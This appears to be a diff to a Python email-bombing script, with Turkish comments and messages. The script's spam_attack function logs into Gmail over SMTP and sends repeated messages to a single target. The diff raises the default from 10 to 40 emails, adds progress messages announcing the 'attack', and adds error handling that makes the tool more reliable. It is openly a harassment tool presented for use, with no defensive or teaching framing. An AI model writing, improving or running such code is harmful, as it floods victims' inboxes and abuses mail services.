@@ -1,12 +1,15 @@
 import smtplib
 import time
 
-def spam_attack(sender_email, password, target_email, message_body, count=10):
+def spam_attack(sender_email, password, target_email, message_body, count=40):
     try:
         # SMTP sunucusuna bağlan
+        print("Bağlantı kuruluyor...")
         server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login(sender_email, password)
+        server.starttls()  # TLS (Transport Layer Security) başlat
+        server.login(sender_email, password)  # Giriş yap
+        
+        print("Bağlantı başarılı! Spam mail gönderiliyor...")
 
         # Spam e-postalarını gönder
         for i in range(count):
@@ -19,7 +22,12 @@ def spam_attack(sender_email, password, target_email, message_body, count=10):
             print(f"Spam mail {i+1} gönderildi.")
             time.sleep(1)  # 1 saniye bekle
         
-        server.quit()
+        server.quit()  # Bağlantıyı kapat
+        print("Tüm spam mailler başarıyla gönderildi.")
+    except smtplib.SMTPAuthenticationError:
+        print("Giriş hatası: Kullanıcı adı veya şifre yanlış.")
+    except smtplib.SMTPException as e:
+        print(f"SMTP hatası: {e}")
     except Exception as e:
         print(f"Bir hata oluştu: {e}")
 
@@ -53,8 +61,8 @@ def main():
     print("SPAM attack başlatılıyor...")
     time.sleep(2)
 
-    # Spam e-posta gönderme işlemi
-    spam_attack(sender_email, password, target_email, message_body, count=10)
+    # 40 adet spam e-posta gönderme işlemi
+    spam_attack(sender_email, password, target_email, message_body, count=40)
     
     print("Saldırı tamamlandı. Teşekkürler!")
 
